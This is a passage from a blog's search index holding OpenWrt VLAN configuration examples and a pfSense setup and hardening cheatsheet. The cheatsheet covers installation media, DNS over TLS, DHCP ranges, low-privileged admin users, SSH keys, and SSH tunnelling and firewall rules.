'lan4'\n\nconfig interface 'home'\n    option device 'br-lan.1'\n    option proto 'static'\n    option ipaddr '192.168.1.1'\n    option netmask '255.255.255.0'\n\nconfig interface 'office'\n    option device 'br-lan.2'\n    option proto 'static'\n    option ipaddr '192.168.13.1'\n    option netmask '255.255.255.0'\n</code></pre> <p>Example configurations of VLANS with VLAN Tagging:</p> <pre><code># /etc/config/network\nconfig device\n    option name 'br-lan'\n    option type 'bridge'\n    list ports 'lan1'\n    list ports 'lan2'\n    list ports 'lan3'\n    list ports 'lan4'\n\nconfig bridge-vlan\n    option device 'br-lan'\n    option vlan '1'\n    list ports 'lan1'\n    list ports 'lan2'\n    list ports 'lan3'\n    list ports 'lan4:t'\n\nconfig bridge-vlan\n    option device 'br-lan'\n    option vlan '2'\n    list ports 'lan4:u*'\n\nconfig interface 'lan'\n    option device 'br-lan.1'\n    option proto 'static'\n    option ipaddr '192.168.1.1'\n    option netmask '255.255.255.0'\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/","title":"pfSense administration","text":"<p>A quick reference for pfSense administration.</p> <ul> <li>pfSense Documentation<ul> <li>https://docs.netgate.com/pfsense/en/latest/index.html</li> </ul> </li> </ul> <p>In all cases where the pfSense documentation is either referenced directly or closely adapted, a link back to the source page or section is provided.</p> <p>Many of the initial steps are the same as the pfSense documents, but with less or different detail, and organized in a way that I've found I repeat when setting up a pfSense system. This cheatsheet most closely resembles the creation of a home lab, and ways of gaining visibility into a small set of networks. Be sure to review the pfSense documentation for complete details.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#additional-references","title":"Additional References","text":"<ul> <li> <p>FreeBSD Handbook - Get started with the CLI using this as a reference.</p> <ul> <li>https://docs.freebsd.org/en/books/handbook/basics/</li> <li>https://www.freebsd.org/copyright/freebsd-doc-license/</li> </ul> </li> <li> <p>Lawrence Systems - Channel covering all things networking. Many pfSense examples were adapted directly from there.</p> <ul> <li>https://www.youtube.com/user/TheTecknowledge/videos</li> <li>https://creativecommons.org/licenses/by/3.0/</li> </ul> </li> <li> <p>The Cyber Plumber's Handbook - Free pdf with in depth but very clear and easy to understand exercises of traversing networks.</p> <ul> <li>https://github.com/opsdisk/the_cyber_plumbers_handbook</li> <li>https://creativecommons.org/licenses/by-nc-nd/4.0/</li> </ul> </li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#downloading","title":"Downloading","text":"<p>Install image documentation:</p> <ul> <li>https://docs.netgate.com/pfsense/en/latest/install/download-installer-image.html</li> <li>https://docs.netgate.com/pfsense/en/latest/install/download-installer-image.html#verifying-the-integrity-of-the-download</li> </ul> <p>pfSense installer images: - https://www.pfsense.org/download/</p> <p>Be sure to verify the sha256sum of the installer file</p> <pre><code>user@device:/home/user/Downloads$ sha256sum -c ./pfSense-CE-2.6.0-RELEASE-amd64.iso.gz.sha256\npfSense-CE-2.6.0-RELEASE-amd64.iso.gz: OK\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#installation","title":"Installation","text":""},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#physical-hardware","title":"Physical Hardware","text":"<p>This section is closely adapted from here: https://docs.netgate.com/reference/create-flash-media.html</p> <ol> <li> <p>Creating bootable media</p> </li> <li> <p>Insert your external device (typically usb).</p> </li> <li> <p>Identify the device path under <code>/dev/X</code> by running <code>dmesg | tail</code>.</p> </li> <li> <p>Another easy way to identify device mount point is with the Gnome <code>disks</code> utility, or <code>gparted</code>.</p> </li> <li> <p>Erase the target media partition table:</p> </li> </ol> <p>https://docs.netgate.com/reference/create-flash-media.html#cleaning-the-target-disk</p> <pre><code>sudo dd if=/dev/zero of=&lt;usb_device_name&gt; bs=1M count=1\nsudo dd if=/dev/zero of=/dev/sdx bs=1M count=1\n</code></pre> <p>Here <code>/dev/sdx</code> is used as an example. If you have two internal SSD's, you'll likely have <code>/dev/sda</code> and <code>/dev/sdb</code></p> <p>Connecting a third removable USB drive, will then show up under <code>/dev</code> as <code>/dev/sdc</code></p> <p>NVME drives will show up as <code>/dev/nvme0n1</code>, <code>/dev/nvme1n1</code> and so on.</p> <ul> <li>Write pfSense image to media:</li> </ul> <p>https://docs.netgate.com/reference/create-flash-media.html#write-the-image</p> <pre><code>sudo dd if=&lt;image_file_name&gt; of=&lt;usb_device_name&gt; bs=4M status=progress\nsudo dd if=/opt/iso/pfSense-CE-2.6.0-RELEASE-amd64.iso of=/dev/sdx bs=4M status=progress\n\n# you should see output similar to the following, this operation does not take long:\n182+1 records in\n182+1 records out\n767463424 bytes (767 MB, 732 MiB) copied, 10.8692 s, 70.6 MB/s\n</code></pre> <p>See this table of examples for all OS's:</p> <ul> <li>https://docs.netgate.com/reference/create-flash-media.html#cleaning-the-target-disk</li> </ul> <p>Alternatively on Windows you can use:</p> <ul> <li>https://github.com/balena-io/etcher/releases</li> </ul> <p>or</p> <ul> <li>https://github.com/pbatard/rufus/releases</li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#powering-on-for-install","title":"Powering On for Install.","text":"<p>Read every step before starting.</p> <p>Serial console commands and information taken directly from here: https://docs.netgate.com/pfsense/en/latest/hardware/connect-to-console.html#minicom</p> <ul> <li>Disconnect all ethernet cables<ul> <li>From pfSense device</li> <li>From management PC</li> </ul> </li> <li>Serial cable is unplugged</li> <li> <p>pfSense device is powered off</p> </li> <li> <p>Connect the serial cable to both devices</p> </li> <li>Start the serial console output on your managing PC:<ul> <li>Identify the device name: <code>find /dev -name \"*ttyUSB*\" -ls 2&gt;/dev/null</code></li> <li>Replace <code>/dev/ttyUSBX</code> with your device name: <code>sudo screen /dev/ttyUSBX 115200</code></li> <li>This will simply be a blank <code>screen</code> session until the pfSense machine powers on</li> </ul> </li> <li>Plug in the installation media USB to the pfSense device</li> <li>Power on pfSense device<ul> <li>Be ready to be back at your keyboard here</li> </ul> </li> <li>Press any key to interrupt boot when prompted<ul> <li>This happens relatively quickly after powering on the device, and gives you ~2 seconds to stop the boot sequence</li> </ul> </li> </ul> <p>From here your steps depend on the hardware's UEFI BIOS / shell settings to mount and run media.</p> <ul> <li>Netgate devices for example have a built-in shell which takes commands documented in each of their appliance's specific manuals</li> <li>Choose filesystem type (UFS / ZFS) and target installation media (the internal disk to install pfSense on)<ul> <li>Some 32-bit OS images do not support the ZFS (SG-3100 for example)</li> </ul> </li> </ul> <p>When installation is finished, the console menu will indicate this clearly stating it has <code>halted</code> and be technically powered 'off' at this point</p> <ul> <li>Remove the insallation media</li> <li>Powercycle the device<ul> <li>Unplug the power cable</li> <li>Wait 60 seconds</li> <li>Reconnect the power cable</li> </ul> </li> </ul> <p>To quit the serial console <code>screen</code> terminal: <code>CTRL+SHIFT+A</code>; then press <code>\\</code></p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#virtual-machine","title":"Virtual Machine","text":"<p>Recommended machine settings:</p> <ul> <li>1 Processor</li> <li>2 vCPU Per Processor (minimum 1 vCPU)</li> <li>2048 GB RAM (minimum 1024 GB RAM)</li> <li>NAT or Bridged Networking (The first public interface will be assigned as the WAN)</li> <li>20+ GB Disk Size</li> <li>1+ LAN Segements (VMware) or Internal Network Segments (VirtualBox)</li> <li>UEFI Firmware</li> </ul> <p>Incompatible machine settings:</p> <ul> <li>DO NOT add a TPU (VMware)</li> <li>DO NOT enable Secure Boot (VMware)</li> </ul> <p>TO DO: add screenshots showing VMware / VirtualBox configurations prior to the first boot.</p> <p>The installation process:</p> <p>https://docs.netgate.com/pfsense/en/latest/install/install-walkthrough.html</p> <p>All defaults during the install steps are fine. It's recommended to use the ZFS filesystem from pfSense version 2.6.0 and onward.</p> <ul> <li>Auto (ZFS) Guided Root-on-ZFS<ul> <li>Here on <code>Configure Options:</code> where <code>&gt;&gt;&gt; Install</code> is highlighted, press [Enter]</li> <li>Press [Enter] on <code>stripe</code> here unless you want <code>RAID</code></li> <li>Press [Space] to 'select' the checkbox next to your virtual disk &gt; <code>[*]</code> then press [Enter]<ul> <li>If you don't select an available disk, it will let you know</li> </ul> </li> <li>Select <code>&lt; YES &gt;</code> then press [Enter]</li> <li>Skip spawning a shell unless you need to</li> <li>Press [Enter] here with <code>&lt; Reboot &gt;</code> selected</li> </ul> </li> </ul> <p>At this point you will be at the welcome menu for the console.</p> <p>Optionally Press 8 to drop into a shell and make changes immediately.</p> <p>For example, immediately change the root password:</p> <pre><code>passwd root\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#backup-restore","title":"Backup &amp; Restore","text":"<p>Test your backup configurations.</p> <p>It's a good idea when finalizing the configuration of your machine, or resinstalling / upgrading the OS to always:</p> <ol> <li>Download an encrypted full configuration backup xml file.</li> <li>Immediately test restoring that configuration file to the target machine<ul> <li><code>Preserve Switch Configruation</code> keeps the switch configuration currently running on the machine, and IGNORES the switch configuration that would be restored from the backup xml file</li> </ul> </li> <li>If the configuration restores successfully, you're ready to proceed with reinstalling / upgrading pfSense</li> </ol>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#initial-setup-post-install","title":"Initial Setup (Post Install)","text":"<p>The fist steps in most cases.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#initial-setup-via-the-console-via-vm-external-display-or-serial-console","title":"Initial Setup via the Console (via VM, external display, or serial console):","text":"<p>Some basics can be easily accomplished from the console. Starting with the network interfaces.</p> <p>https://docs.netgate.com/pfsense/en/latest/hardware/connect-to-console.html#gnu-screen</p> <p>To find the serial USB device and connect via the serial console:</p> <ul> <li><code>find /dev -name \"*ttyUSB*\" -ls 2&gt;/dev/null</code></li> <li><code>sudo screen /dev/ttyUSB0 115200</code></li> </ul> <p>To quit the serial console <code>screen</code> terminal:</p> <ul> <li><code>CTRL+SHIFT+A</code>; then press <code>\\</code></li> </ul> <p>Get which interface is your NAT / Bridged (publicly facing) interface from the shell menu <code>8) Shell</code>:</p> <pre><code># Use less -S to be able to scroll up and right to read terminal\nifconfig | less -S\n</code></pre> <p>If you assigned the default network interface in the hypervisor as the Bridged or NAT interface, it's almost always going to be <code>em0</code>.</p> <p>Proceed to setup the interfaces with the guided prompts at <code>1) Assign Interfaces</code>.</p> <p>Followed by the <code>2) Set interface(s) IP address</code> for each interface.</p> <p>You can also install packages here if you choose to.</p> <p>Be sure to install the accompanying <code>pfSense-pkg-&lt;package-name&gt;</code> for each package that has a way of interfacing with the WebGUI. For example:</p> <pre><code>pkg update -f\npkg install -y sudo pfSense-pkg-sudo\n</code></pre> <p>If you forget to install <code>pfSense-pkg-sudo</code>, you will not be able to configure is from the WebGUI (and in the case of sudo the configuraiton file is actually different).</p> <p>From here, it's recommended to switch over to the WebGUI to finish the remaining setup.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#the-initial-setup-via-the-webgui","title":"The initial setup via the WebGUI:","text":"<p>https://docs.netgate.com/pfsense/en/latest/config/setup-wizard.html</p> <p><code>Block private networks</code> is OK on WAN connected to the public internet (ie; the ip address is publicly routable) though if you plan to <code>-J</code> with ssh into internal subnets, you would not enable this.</p> <p><code>Block Bogons</code> is OK on all interfaces</p> <p>Choose a non-publicly routable tld as the localdomain name, any of these four from RFC 2606 will work:</p> <pre><code>.test\n.example\n.invalid\n.localhost\n</code></pre> <p>However the default here is fine.</p> <p>After you complete the installation and initial setup process you'll be at the dashboard. From there, you can proceed with the following:</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#dns","title":"DNS","text":"<p>The first thing to configure could be DNS. Using DNS over TLS will ensure you're receiving legitimate replies to queries.</p> <p>https://docs.netgate.com/pfsense/en/latest/services/dns/resolver-config.html</p> <p>Under <code>System &gt; General Setup &gt; DNS Server Settings</code></p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#dns-servers","title":"DNS: Servers","text":"<p>The following lists three popular publicly available DNS resolvers that support DNS over TLS forwarded queries:</p> IP Address Hostname for TLS validation <code>1.1.1.1</code> cloudflare-dns.com <code>1.0.0.1</code> cloudflare-dns.com <code>2606:4700:4700::1111</code> cloudflare-dns.com <code>2606:4700:4700::1001</code> cloudflare-dns.com <code>9.9.9.9</code> dns.quad9.net <code>149.112.112.112</code> dns.quad9.net <code>2620:fe::fe</code> dns.quad9.net <code>2620:fe::9</code> dns.quad9.net <code>8.8.8.8</code> dns.google <code>8.8.4.4</code> dns.google <code>2001:4860:4860::8888</code> dns.google <code>2001:4860:4860::8844</code> dns.google <p></p> <p>This is what <code>/var/unbound/unbound.conf</code> may look like with DNS over TLS forwarding enabled:</p> <pre><code>...8&lt;...\n\n# Forwarding\nforward-zone:\n        name: \".\"\n        forward-tls-upstream: yes\n        forward-addr: 1.1.1.1@853#cloudflare-dns.com\n        forward-addr: 1.0.0.1@853#cloudflare-dns.com\n        forward-addr: 2606:4700:4700::1111@853#cloudflare-dns.com\n        forward-addr: 2606:4700:4700::1001@853#cloudflare-dns.com\n        forward-addr: 9.9.9.9@853#dns.quad9.net\n        forward-addr: 149.112.112.112@853#dns.quad9.net\n        forward-addr: 2620:fe::fe@853#dns.quad9.net\n        forward-addr: 2620:fe::9@853#dns.quad9.net\n\n...&gt;8...\n</code></pre> <p>UNCHECK the following if it's checked:</p> <p><code>System &gt; General Setup &gt; DNS Server Override (Allow outside DNS to override server list)</code></p> <p>Set the following option:</p> <p><code>System &gt; General Setup &gt; DNS Resolution Behavior &gt; select \"Use local, ignore remote\"</code></p> <p>This ensures queries are sent to unbound, which then forwards them to upstream DNS over TLS servers.</p> <p>Under <code>Services &gt; DNS Resolver</code>:</p> <ul> <li>[x] Enable DNS Resolver</li> <li>[x] Enable DNSSEC Support* (Check logs if you have issues, and disable. Ideally keep it enabled)</li> <li>[x] Enable Forwarding Mode</li> <li>[x] Use SSL/TLS for outgoing DNS</li> <li>[x] [Optional] DHCP Registration / Static DHCP (Allows Dns resoultion of local <code>&lt;hostname&gt;.&lt;localdomain&gt;</code>)</li> </ul> <p>IMPORTANT: Be sure your <code>/var/unbound/unbound.conf</code> contains the DNS over TLS entries once you configure and apply them in the GUI.</p> <p>For logging, the following three configuration options can be applied. Only <code>log-queries</code> is uncommented here to avoid overwhealming the logs.</p> <p>Add any of the following to the DNS resolver's custom options under 'server':</p> <pre><code>server:\n    log-queries: yes\n    #log-replies: yes\n    #log-tag-queryreply: yes\n</code></pre> <p>This file can be edited manually at <code>/var/unbound/unbound.conf</code></p> <p>See unbound's example configuration file for more:</p> <p>https://github.com/NLnetLabs/unbound/blob/master/doc/example.conf.in</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#dns-filtering-wesbites","title":"DNS: Filtering Wesbites","text":"<p>https://docs.netgate.com/pfsense/en/latest/recipes/block-websites.html</p> <p>The same configuraiton syntax would apply here that you'd use for unbound.</p> <p>One solution is to create a separate file just for this, for example <code>/var/unbound/conf.d/blocklist.conf</code>.</p> <p>You will need to tell unbound to 'include' the <code>/var/unbound/conf.d/</code> directory if you decide to use it by adding the following to <code>/var/unbound/unbound.conf</code>:</p> <pre><code># Include conf.d files\ninclude: /var/unbound/conf.d/*\n</code></pre> <p>METHOD 1 (OLD)</p> <p>This will route all traffic for a given domain to the 'null' address <code>0.0.0.0</code> or <code>::</code> and has been replaced by method 2.</p> <pre><code>local-zone: \"domain.toblock\" redirect\nlocal-data: \"domain.toblock A 0.0.0.0\"\nlocal-data\" \"domain.toblock AAAA ::\"\n</code></pre> <p>METHOD 2 (BEST)</p> <p>The same as method 1, but requiring only a single line. This makes the file easier to generate from other lists, and manage.</p> <pre><code>local-zone: \"domain.toblock\" always_null\n</code></pre> <p>METHOD 3 (SECOND BEST)</p> <p>If you have an older version of unbound that does not support <code>always_null</code> this is your best choice.</p> <pre><code>local-zone: \"domain.toblock\" always_nxdomain\n</code></pre> <p>Block AS Numbers by Alias:</p> <p>Also see this example in the Netgate docs:</p> <p>https://docs.netgate.com/pfsense/en/latest/recipes/block-websites.html</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#network-interfaces","title":"Network Interfaces","text":"<p>https://docs.netgate.com/pfsense/en/latest/config/interface-configuration.html</p> <ul> <li>Enable Interfaces under <code>Interfaces &gt; Assignments</code></li> <li>Configure RFC1918 address range subnets<ul> <li><code>Interfaces &gt; OPTx &gt; Static IPv4 Configuration</code><ul> <li>Assign the interface an address and define the CIDR range available here.</li> <li>EXAMPLE: 192.168.20.1/24</li> </ul> </li> <li>Here is where you configure IPv6 or not</li> </ul> </li> <li>For each interface, <code>Services &gt; DHCP Server &gt;[interface]</code> select <code>Enable DHCP Server</code><ul> <li>[If Static DHCP = no] Set range of +10/-10 hosts, example:<ul> <li>Available range: 192.168.1.1 - 192.168.1.254</li> <li>Set range to: 192.168.1.100 - 192.168.1.200 for 100 available IP addresses</li> </ul> </li> <li>[Optional] Set static DHCP mappings of 127/127<ul> <li>127/127 means 127 IP Addresses available in the dynamic pool, and 127 available in the static pool (127 is half of a /24 network)</li> <li>MAC Address</li> <li>Hostname</li> <li>Choose an IP address from outside of the default range's pool:<ul> <li>Available range: 192.168.1.1 - 192.168.1.254</li> <li>Set range to: 192.168.1.127 - 192.168.1.254 (dynamic range)</li> <li>Available IP's left for static mappings: 192.168.1.1 - 192.168.1.126</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>NOTE: setting range at a +10/-10 minimum is a best practice especially for static mappings, in case interfaces or gateways require changes at a later point in time. This advice has been echoed in various Lawrence Systems videos for setting up networks.</p> <p>TO DO: provide a direct link + timestamp from one of the videos covering this concept.</p> <p>EXAMPLE:</p> <p>The 100-200 pool (Easy for small, home, or lab networks)</p> <ul> <li>Network = 172.16.1.0/24</li> <li>Available Range = 172.16.1.100 to 172.16.1.200</li> </ul> <p>This would make addresses 100 to 200 available for dynamic clients.</p> <p>Any static addresses you would assign then fall under 1-99,201-254.</p> <p>You can set static mappings within dynamic ranges, but if that IP address is taken by a dynamic client it cannot be assigned to the static client requesting it until the dynamic client disconnects and that lease expires.</p> <p>RECOMMENDED: set static mappings to your own devices that will connect to the management port for administration purposes. The prevents any machine from connecting to that port and attempting to reach the management interface via (slow) brute force or a future bypass technique if one is discovered.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#users","title":"Users","text":"<ul> <li> <p><code>System &gt; General Setup</code></p> </li> <li> <p><code>webConfigurator</code> you can change the system <code>Theme</code> as well as add more dashboard columns (3 tends to work well).</p> </li> <li> <p><code>Save</code></p> </li> </ul> <ul> <li> <p><code>System &gt; Advanced</code></p> </li> <li> <p>Console Options</p> </li> <li> <p><code>[x]</code> Password protect the console menu</p> </li> </ul> <p>SSH access - Jump to ssh below to make those changes now.</p> <p>https://docs.netgate.com/pfsense/en/latest/recipes/ssh-access.html</p> <p>https://docs.netgate.com/pfsense/en/latest/config/advanced-admin.html#best-practices-for-ssh</p> <p>Lawrence Systems, on pfSense remote management full video</p> <p>NOTE: Be sure to conduct all of the following from a physical or virtual location with anti-lockout or serial console access just in case!</p> <p>Ideally all management is done over SSH, with BOTH public key and password required for access.</p> <p>However, requiring a public key alone is still fine! And in some cases, is the only way to do remote automation securely.</p> <p>Add your public key to the desired user's page via <code>System &gt; User Manager &gt; User &gt; Authorized SSH Keys</code></p> <p>Alternatively you can add it to the <code>authorized_keys</code> file:</p> <pre><code># The empty line of \"\" is recommened to keep each entry on a separate line. Empty lines aren't interpreted.\necho \"\" &gt;&gt; ~/.ssh/authorized_keys\necho \"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJR19JyOxGYHSxsybdm3OsdFGW+fRITxVxmiB/S//S+60h6nddXZsCl/XhmvmLSXW6Z9EXivXm7428YC/PP3khM= kali@kali\" &gt;&gt; ~/.ssh/authorized_keys\n</code></pre> <p>In the next step, we'll create a lower privilege user for remote access instead of using the built-in admin account (which is root).</p> <p>NOTE: If you're wondering why Kali is used throughout this tutorial, the live disk image now has virtual machine tools installed by default since 2021.3. It's never been so easy to spin up a working and fully capable OS without running any post configuration scripts. There's also a vast array of useful tools available by default (ie; <code>screen</code>, <code>wireshark</code>, <code>burpsuite</code>, etc) which can be invaluable in troubleshooting and exploring your own devices. While it hasn't always been the best option for beginnners, if you're familiar with Ubuntu and Linux in general you'll do fine.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#creating-a-low-privileged-user-for-management-gui","title":"Creating a low privileged user for management (GUI):","text":"<p>Lawrence Systems, on pfSense remote management, timestamped at User Management</p> <p>The following points try to summarize what the video covers:</p> <ul> <li><code>System &gt; User Manager &gt; Add</code></li> <li>Create a username and password (saved to your password manager)</li> <li><code>Group Membership</code> you'll want to highlight <code>admins</code> and select <code>&gt;&gt; Move to \"Member of\" list</code> so this user can access the Web UI and login remotely.</li> <li>Add the SSH public key for this user: <code>System &gt; User Manager &gt; Edit user (admin) &gt; User1 &gt; Authorized SSH Keys</code></li> <li>Save</li> <li>Return to the page for the new user again.</li> <li>Under <code>Effective Privileges</code> choose <code>+Add</code> and <code>Ctrl+click</code> to highlight BOTH <code>WebCfg - All pages</code> and <code>User - System: Shell account access</code> then choose <code>Save</code> at the bottom of the page.</li> <li>Save</li> <li>Next, disable the built-in admin account: <code>System &gt; User Manager &gt; Edit user (admin) &gt; Disabled</code>, check <code>This user cannot login</code></li> <li>Save</li> </ul> <p>NOTE: This will prevent the built-in admin account from both, SSH, and logging in to the WebGUI.</p> <p>Optional, but recommended:</p> <ul> <li><code>System &gt; Package Manager &gt; Available Packages</code> install <code>sudo</code></li> </ul> <p>Sudo can be managed under <code>System &gt; sudo</code>, though the default settings work exactly as you'd expect.</p> <p>After install, the sudoers file under <code>/usr/local/etc/sudoers</code> will look like:</p> <pre><code>root ALL=(root) ALL\nadmin ALL=(root) ALL\n%admins ALL=(root) ALL\n</code></pre> <p>Meaning the <code>admins</code> group is funcitonally similar to being in group <code>sudo</code> in Debian-based systems.</p> <p>NOTE: you do not need <code>sudo</code> installed to access the GUI over an SSH tunnel - the <code>Diagnostics &gt; Command Prompt</code> shell still runs as root, and you can still install <code>sudo</code> later should you choose.</p> <p>WHY?</p> <p>Creating a dedicated management user mitigates the damage a local attacker can do, as the account password + sudo will be required to elevate privileges without a local exploit.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#creating-a-low-privileged-user-for-management-console","title":"Creating a low privileged user for management (Console)","text":"<p>This next section directly references and is adapted from here:</p> <p>https://docs.freebsd.org/en/books/handbook/basics/#users-synopsis</p> <p>This will create an equivalent user account with groups similar to the steps you'd follow in the GUI.</p> <p>The only difference is the $HOME directory is not world readable, we use <code>750</code> instead of the default of <code>755</code>.</p> <p>Run the <code>adduser</code> utility with root privileges to be walked through the following prompt:</p> <pre><code>[2.6.0-RELEASE][user2@pfSense.home.arpa]/home/user2: sudo adduser\nUsername: user4\nFull name: Fourth User\nUid (Leave empty for default):\nLogin group [user4]: nobody\nLogin group is nobody. Invite user4 into other groups? []: admins\nLogin class [default]:\nShell (sh csh tcsh ssh_tunnel_shell scponly scponlyc git-shell bash rbash nologin) [sh]: tcsh\nHome directory [/home/user4]:\nHome directory permissions (Leave empty for default): 750\nUse password-based authentication? [yes]:\nUse an empty password? (yes/no) [no]:\nUse a random password? (yes/no) [no]:\nEnter password:\nEnter password again:\nLock out the account after creation? [no]:\nUsername   : user4\nPassword   : *****\nFull Name  : Fourth User\nUid        : 2004\nClass      :\nGroups     : nobody admins\nHome       : /home/user4\nHome Mode  : 750\nShell      : /bin/tcsh\nLocked     : no\nOK? (yes/no): yes\nadduser: INFO: Successfully added (user4) to the user database.\nAdd another user? (yes/no): no\nGoodbye!\n</code></pre> <p>Next you should have the following output:</p> <pre><code>[2.6.0-RELEASE][user2@pfSense.home.arpa]/home/user2: su user4\nPassword:\nuser4@pfSense:/home/user2 % id\nuid=2004(user4) gid=65534(nobody) groups=65534(nobody),1999(admins)\n</code></pre> <p>To add a user to a group:</p> <pre><code>sudo pw groupmod somegroup -m user\nsudo pw groupmod admins -m user5\n</code></pre> <p>To remove a user from a group:</p> <pre><code>sudo pw groupmod somegroup -d user\nsudo pw groupmod zeek -d analyst1\n</code></pre> <p>To create, review, and delete a group:</p> <p>https://docs.freebsd.org/en/books/handbook/basics/#users-groups</p> <pre><code>sudo pw groupadd logsync\nsudo pw groupshow logsync\nsudo pw groupdel logsync\n</code></pre> <p>To remove a user:</p> <pre><code>[2.6.0-RELEASE][user2@pfSense.home.arpa]/home/user2: sudo rmuser user1\nMatching password entry:\n\nuser1:.../home/user1:/bin/tcsh\n\nIs this the entry you wish to remove? y\nRemove user's home directory (/home/user1)? y\nRemoving user (user1): mailspool home passwd.\n</code></pre> <p>Install sudo</p> <pre><code>pkg install -y sudo pfSense-pkg-sudo\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#ssh","title":"SSH","text":""},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#system-advanced","title":"<code>System &gt; Advanced</code>","text":"<ul> <li>Secure Shell<ul> <li>Check <code>Enable Secure Shell</code></li> <li>Change <code>SSHd Key Only</code> to either <code>Public Key Only</code> or <code>Require Both Password and Public Key</code></li> <li>Optionally change the <code>SSH port</code></li> </ul> </li> </ul> <p>Click <code>Save</code> at the bottom here when finished. Optionally change the port to prevent the logs from being flooded with bruteforce attempts.</p> <p>By default every 3 failed attempts will result in a timed lockout, making bruteforce next to impossible.</p> <p>This allows accessing the http GUI over a portforward via ssh:</p> <pre><code>ssh -p &lt;port&gt; -L 127.0.0.1:8443:127.0.0.1:443 root@pfsense.ip\n</code></pre> <p>Browsing to https://127.0.0.1:8443 on the local machine will allow you to access the web GUI</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#ssh-firewall-rules","title":"SSH Firewall Rules","text":"<p>Remote Management With SSH:</p> <p>Lawence Systems again on SSH remote management.</p> <p><code>Firewall &gt; Rules &gt; WAN &gt; Add Rule</code></p> <pre><code># Same video as just above, timestamped at SSH firewall rules: https://youtu.be/MVoe3mX_UZQ?t=347\nProtocol: TCP\nSource: Any | &lt;static-ip-range&gt;           # ingress filter source addresses if you can, however it's still OK if you must allow any for remote management (ssh is a secure protocol to expose publicly if properly configured)\nDestination: This firewall (self)\nDestination Port: ssh | (other) &lt;port&gt;    # change the port to the random port you made ssh listen to in the management menu above, otherwise leave as 'ssh'\nDescription: SSH Remote Access\nSave\nApply\n</code></pre> <p>TIP: Firefox containers or separate Chrome profiles are great to have on hand if you're managing multiple instances with SSH local port-forwarding. All of the session tabs in your browser share the same (localhost) hostname / ip in this case. Using containers and profiles (don't forget isolate origins and site per process on chrome) will further isolate those web interfaces in case one of them is compromised.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#-j-ssh-jump-proxy","title":"-J SSH Jump Proxy","text":"<p>If you manage multiple machines behind a remote pfSense box, use the <code>-J</code> jump proxy switch instead of the (less secure) agent-forwarding on the pfSense ssh daemon.</p> <p>It accomplishes this by tunneling tcp over ssh instead of forwarding the session (which caches your key's identity material) at each host along the way.</p> <p>Attackers with access to the jump boxes with forwarding enabled can impersonate (not steal) the key identity on that jump box should they be able to access the cache.</p> <p>To use <code>-J</code>, each ssh server in the chain needs your public key.</p> <p>Separate each internal host along the path with commas <code>,</code> and specify ports as <code>user@host:&lt;port&gt;</code>: <pre><code>ssh -J user@public-ip:port,user@internaljump1:port,user@internaljump2:port -p &lt;port&gt; -L 127.0.0.1:8080:127.0.0.1:80 user@interalhost.ip\n#    ^___________________________________________________________________^  ^_____________________________________^\n#                       The -J argument is one string                         All additional ssh arguments follow as normal\n</code></pre></p> <p>Reference: The Cyber Plumber's Handbook (SSH Tunneling) for many more examples</p> <p>https://github.com/opsdisk/the_cyber_plumbers_handbook</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#serial-console","title":"Serial Console","text":"<p>Closely adapted from: https://docs.netgate.com/pfsense/en/latest/hardware/connect-to-console.html#gnu-screen</p> <p>Under <code>System &gt; Advanced &gt; Console Menu</code> check <code>Password protect the console menu</code></p> <p>Connecting a serial cable using usb adapted to serial connection will be listed under <code>/dev</code> as <code>/dev/ttyUSB0</code></p> <p>The default speed (in pfSense and other cases) is <code>115200</code></p> <p>Gnu screen (Kali, Ubuntu)</p> <p><code>screen</code> is available by default in Kali / Kali Live.</p> <p>On Ubuntu: <pre><code>sudo apt install -y screen\n</code></pre></p> <p>After connecting the USB-end to your local PC and the serial-end to the firewall device, check that the device is visible from your PC: <pre><code>find /dev -name \"*ttyUSB*\" -ls 2&gt;/dev/null\n</code></pre></p> <p>You're looking for a device name similar to <code>ttyUSB0</code>, but note that the number or name may be slightly different.</p> <p>Once you've identified the device, connect with: <pre><code>sudo screen /dev/ttyUSB0 115200\n</code></pre></p> <p>If the device is powered off here, the screen will be blank until you power the device back on. You'll see the boot cycle then.</p> <p>If there\u2019s an encoding mismatch, try UTF-8 mode: <pre><code>sudo screen -U /dev/cu.SLAB_USBtoUART 115200\n</code></pre></p> <p>To quit:</p> <p><code>CTRL+SHIFT+A</code>; then press <code>\\</code></p> <p>NOTE: connecting the workstation to the target device over serial cable before powering the target device on, will allow you to identify the serial cable\u2019s USB id\u2019s to enter into VirtualBox. This prevents an external device from potentially interfacing directly with the host.</p> <p>Similarly, VMware (on Windows) allows USB arbitration at plug-in, so you can choose whether it connects to the host or a VM.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#protect-the-management-port","title":"Protect the Management Port","text":"<p>Generally management via a web interface should only be accessible from a management subnet / dedicate management interface. The workaround if you require remote access, or if the network is completely flat, is to configure the web interface to only listen on localhost (<code>127.0.0.1</code> and <code>::1</code>), and open 